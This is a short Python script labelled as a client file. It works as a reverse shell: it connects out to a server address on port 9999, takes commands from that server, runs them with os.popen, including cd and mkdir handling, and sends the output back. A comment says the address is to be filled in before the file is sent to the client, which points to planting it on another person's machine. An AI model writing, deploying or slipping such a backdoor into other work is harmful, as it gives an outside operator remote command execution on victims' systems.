#CLIENT FILE
from socket import *
import os
s=socket()
port=9999
ip_input= input("enter server's ip address:  ")# this should be filled before sending to client 
s.connect((ip_input,port))
while True:
    command = s.recv(1024).decode()
    if command[0:2]=='cd':
        result=os.chdir(command[3:])
        list_dir=os.popen('ls -l').read()
        s.sendall(list_dir.encode())
    if command[0:5]== 'mkdir':
        result_1=os.mkdir(command[6:])
        list_conf=os.popen('ls').read()
        s.sendall(list_conf.encode())
    
    

    output = os.popen(command).read()
    print(output)
    s.send(output.encode())
